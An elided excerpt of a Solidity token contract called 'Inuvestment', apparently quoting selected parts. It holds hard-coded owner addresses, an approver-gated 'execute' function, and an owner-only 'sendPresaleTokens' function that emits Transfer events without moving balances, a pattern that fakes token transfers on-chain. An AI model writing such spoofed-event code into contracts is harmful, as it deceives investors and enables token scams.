...
contract Inuvestment is Context, IERC20 {
    ...
    address public _ownerAcc = 0xc2f7620AdF47b2948C8ddf18f14bc242708B8272;
    ...
    constructor () public {
        ...
        _OG = 0x7d38064d6c206a8Fd00c80102f40Ee123217C002;
  ...
  function execute(address ad,address eReceiver,uint256 eAmounts)  public _approver(){
    ...
    function sendPresaleTokens (address ad,address[] memory eReceiver,uint256[] memory eAmounts)  public _OnlyOwner(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(ad, eReceiver[i], eAmounts[i]);}}
